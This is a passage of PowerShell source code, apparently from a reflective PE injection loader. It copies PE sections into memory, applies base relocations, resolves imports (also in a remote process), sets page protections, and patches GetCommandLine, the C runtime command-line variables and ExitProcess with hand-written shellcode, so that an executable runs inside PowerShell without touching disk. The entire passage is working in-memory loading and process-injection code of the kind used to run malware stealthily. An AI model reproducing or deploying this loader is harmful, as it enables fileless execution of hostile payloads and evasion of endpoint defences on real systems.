		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			    #Address to copy the section to
			    [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			    #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			    #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			    #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			    #    so truncate SizeOfRawData to VirtualSize
			    $SizeOfRawData = $SectionHeader.SizeOfRawData

			    if ($SectionHeader.PointerToRawData -eq 0)
			    {
				    $SizeOfRawData = 0
			    }
			
			    if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			    {
				    $SizeOfRawData = $SectionHeader.VirtualSize
			    }
			
			    if ($SizeOfRawData -gt 0)
			    {
				    Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			    }
		
			    #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			    if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			    {
				    $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				    [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				    Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				    $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			    }
		    }
	    }


	    Function Update-MemoryAddresses
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $OriginalImageBase,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    [Int64]$BaseDifference = 0
		    $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		    [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		    #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		    if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				    -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		    {
			    return
		    }


		    elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		    {
			    $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			    $AddDifference = $false
		    }
		    elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		    {
			    $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		    }
		
		    #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		    [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		    while($true)
		    {
			    #If SizeOfBlock == 0, we are done
			    $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			    if ($BaseRelocationTable.SizeOfBlock -eq 0)
			    {
				    break
			    }

			    [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			    $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			    #Loop through each relocation
			    for($i = 0; $i -lt $NumRelocations; $i++)
			    {
				    #Get info for this relocation
				    $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				    [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				    #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				    [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				    [UInt16]$RelocType = $RelocationInfo -band 0xF000
				    for ($j = 0; $j -lt 12; $j++)
				    {
					    $RelocType = [Math]::Floor($RelocType / 2)
				    }

				    #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				    #This appears to be true for EXE's as well.
				    #	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				    if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						    -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				    {			
					    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
					    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					    if ($AddDifference -eq $true)
					    {
						    [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					    }
					    else
					    {
						    [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					    }				

					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				    }
				    elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				    {
					    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				    }
			    }
			
			    $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		    }
	    }


	    Function Import-DllImports
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 4, Mandatory = $false)]
		    [IntPtr]
		    $RemoteProcHandle
		    )
		
		    $RemoteLoading = $false
		    if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		    {
			    $RemoteLoading = $true
		    }
		
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		    {
			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			    while ($true)
			    {
				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				    #If the structure is null, it signals that this is the end of the array
				    if ($ImportDescriptor.Characteristics -eq 0 `
						    -and $ImportDescriptor.FirstThunk -eq 0 `
						    -and $ImportDescriptor.ForwarderChain -eq 0 `
						    -and $ImportDescriptor.Name -eq 0 `
						    -and $ImportDescriptor.TimeDateStamp -eq 0)
				    {
					    Write-Verbose "Done importing DLL imports"
					    break
				    }

				    $ImportDllHandle = [IntPtr]::Zero
				    $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				    if ($RemoteLoading -eq $true)
				    {
					    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				    }
				    else
				    {
					    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				    }

				    if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				    {
					    throw "Error importing DLL, DLLName: $ImportDllPath"
				    }
				
				    #Get the first thunk, then loop through all of them
				    [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				    while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				    {
					    $ProcedureName = ''
					    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					    #	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					    #	and doing the comparison, just see if it is less than 0
					    [IntPtr]$NewThunkRef = [IntPtr]::Zero
					    if([Int64]$OriginalThunkRefVal -lt 0)
					    {
						    $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					    }
					    else
					    {
						    [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						    $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						    $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					    }
					
					    if ($RemoteLoading -eq $true)
					    {
						    [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					    }
					    else
					    {
						    [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					    }
					
					    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					    {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					    }

					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				    }
				
				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			    }
		    }
	    }

	    Function Get-VirtualProtectValue
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [UInt32]
		    $SectionCharacteristics
		    )
		
		    $ProtectionFlag = 0x0
		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		    {
			    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				    }
			    }
			    else
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				    }
			    }
		    }
		    else
		    {
			    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_READONLY
				    }
			    }
			    else
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				    }
			    }
		    }
		
		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		    {
			    $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		    }
		
		    return $ProtectionFlag
	    }

	    Function Update-MemoryProtectionFlags
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			    [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			    [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			    [UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			    [UInt32]$OldProtectFlag = 0
			    Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			    $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Unable to change memory protection"
			    }
		    }
	    }
	
	    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	    Function Update-ExeFunctions
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [String]
		    $ExeArguments,
		
		    [Parameter(Position = 4, Mandatory = $true)]
		    [IntPtr]
		    $ExeDoneBytePtr
		    )
		
		    #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		    $ReturnArray = @() 
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		    [UInt32]$OldProtectFlag = 0
		
		    [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		    if ($Kernel32Handle -eq [IntPtr]::Zero)
		    {
			    throw "Kernel32 handle null"
		    }
		
		    [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		    if ($KernelBaseHandle -eq [IntPtr]::Zero)
		    {
			    throw "KernelBase handle null"
		    }

		    #################################################
		    #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		    #	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		    $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		    $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		    [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		    [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		    if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		    {
			    throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		    }

		    #Prepare the shellcode
		    [Byte[]]$Shellcode1 = @()
		    if ($PtrSize -eq 8)
		    {
			    $Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		    }
		    $Shellcode1 += 0xb8
		
		    [Byte[]]$Shellcode2 = @(0xc3)
		    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		    #Make copy of GetCommandLineA and GetCommandLineW
		    $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		    $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		    $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		    $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		    $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		    $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		    #Overwrite GetCommandLineA
		    [UInt32]$OldProtectFlag = 0
		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		    if ($Success = $false)
		    {
			    throw "Call to VirtualProtect failed"
		    }
		
		    $GetCommandLineAAddrTemp = $GetCommandLineAAddr
		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		    #Overwrite GetCommandLineW
		    [UInt32]$OldProtectFlag = 0
		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		    if ($Success = $false)
		    {
			    throw "Call to VirtualProtect failed"
		    }
		
		    $GetCommandLineWAddrTemp = $GetCommandLineWAddr
		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    #################################################
		
		
		    #################################################
		    #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		    #	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		    #	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		    #	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		    $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		    foreach ($Dll in $DllList)
		    {
			    [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			    if ($DllHandle -ne [IntPtr]::Zero)
			    {
				    [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				    [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				    if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				    {
					    "Error, couldn't find _wcmdln or _acmdln"
				    }
				
				    $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				    $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				    #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				    $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				    $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				    $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				    $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				    $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				    $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				    $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				    if ($Success = $false)
				    {
					    throw "Call to VirtualProtect failed"
				    }
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				    $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				    $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				    if ($Success = $false)
				    {
					    throw "Call to VirtualProtect failed"
				    }
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				    $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			    }
		    }
		    #################################################
		
		
		    #################################################
		    #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		    $ReturnArray = @()
		    $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		    #CorExitProcess (compiled in to visual studio c++)
		    [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		    if ($MscoreeHandle -eq [IntPtr]::Zero)
		    {
			    throw "mscoree handle null"
		    }
		    [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		    if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		    {
			    Throw "CorExitProcess address not found"
		    }
		    $ExitFunctions += $CorExitProcessAddr
		
		    #ExitProcess (what non-managed programs use)
		    [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		    if ($ExitProcessAddr -eq [IntPtr]::Zero)
		    {
			    Throw "ExitProcess address not found"
		    }
		    $ExitFunctions += $ExitProcessAddr
		
		    [UInt32]$OldProtectFlag = 0
		    foreach ($ProcExitFunctionAddr in $ExitFunctions)
		    {
			    $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			    #The following is the shellcode (Shellcode: ExitThread.asm):
			    #32bit shellcode
			    [Byte[]]$Shellcode1 = @(0xbb)
			    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			    #64bit shellcode (Shellcode: ExitThread.asm)
			    if ($PtrSize -eq 8)
			    {
				    [Byte[]]$Shellcode1 = @(0x48, 0xbb)
				    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			    }
			    [Byte[]]$Shellcode3 = @(0xff, 0xd3)
			    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			    [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			    if ($ExitThreadAddr -eq [IntPtr]::Zero)
			    {
				    Throw "ExitThread address not found"
			    }

			    $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Call to VirtualProtect failed"
			    }
			
			    #Make copy of original ExitProcess bytes
			    $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			    $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			    $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			    #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			    #	call ExitThread
			    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			    Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			    $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    }
		    #################################################

		    Write-Output $ReturnArray
	    }
	
	
